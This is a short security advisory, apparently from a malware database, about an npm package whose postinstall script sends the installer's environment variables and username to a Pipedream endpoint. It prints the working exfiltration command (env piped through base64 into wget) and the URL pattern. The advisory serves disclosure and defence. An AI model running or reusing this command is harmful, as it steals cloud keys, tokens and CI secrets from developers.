summary: postinstall exfiltrates environment variables and username to attacker-controlled Pipedream endpoint
details: package.json declares a postinstall lifecycle script that runs automatically on npm install. The script executes `env | base64 | wget --post-file -` to a Pipedream request-capture URL of the form http://$(whoami).eodxy50gl486xrx.m.pipedream.net, exfiltrating the entire process environment (which on developer and CI hosts typically includes AWS/GCP/Azure keys, npm and GitHub tokens, database URLs, and CI secrets) along with the installer's local username encoded into the subdomain. There is no legitimate functionality in the package; the sole install-time effect is bulk credential harvest to an author-controlled endpoint.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
